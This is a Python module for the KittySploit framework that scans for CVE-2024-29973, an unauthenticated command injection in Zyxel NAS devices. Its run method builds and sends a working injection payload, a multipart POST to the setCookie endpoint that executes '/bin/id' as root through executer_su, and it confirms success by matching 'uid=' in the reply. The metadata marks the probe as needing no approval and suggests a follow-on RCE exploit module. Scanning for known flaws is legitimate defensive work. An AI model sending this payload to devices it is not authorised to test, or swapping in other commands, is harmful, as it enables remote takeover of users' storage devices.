#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zyxel NAS setCookie command injection (CVE-2024-29973 family)."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zyxel NAS - setCookie Command Injection Detection (CVE-2024-29973)',
        'description': (
            'Detects Zyxel NAS command injection via multipart POST to '
            '/cmd,/simZysh/register_main/setCookie (CVE-2024-29973 and related Jun 2024 issues).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2024', 'zyxel', 'nas', 'rce', 'cmdi',
            'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/http/zyxel_cve_2024_29973_rce'],
            },
        },
        'references': [
            'https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-multiple-vulnerabilities-in-nas-products-06-04-2024',
            'https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-29973',
        ],
        'cve': 'CVE-2024-29973',
    }

    def run(self):
        bound = secrets.token_hex(8)
        path = '/cmd,/simZysh/register_main/setCookie'
        data = (
            f'--{bound}\r\n'
            f'Content-Disposition: form-data; name="c0"\r\n\r\n'
            'storage_ext_cgi CGIGetExtStoInfo None) and False or '
            '__import__("subprocess").check_output('
            '"/usr/local/apache/web_framework/bin/executer_su /bin/id", shell=True)#\r\n'
            f'--{bound}--\r\n'
        )
        r = self.http_request(
            method='POST',
            path=path,
            data=data,
            headers={'Content-Type': f'multipart/form-data; boundary={bound}'},
            allow_redirects=False,
        )
        if not r:
            return False
        body = r.text or ''
        if re.search(r'uid=\d+', body):
            self.set_info(
                severity='critical',
                reason='Zyxel NAS CVE-2024-29973 setCookie command injection confirmed',
                path=path,
            )
            return True
        return False
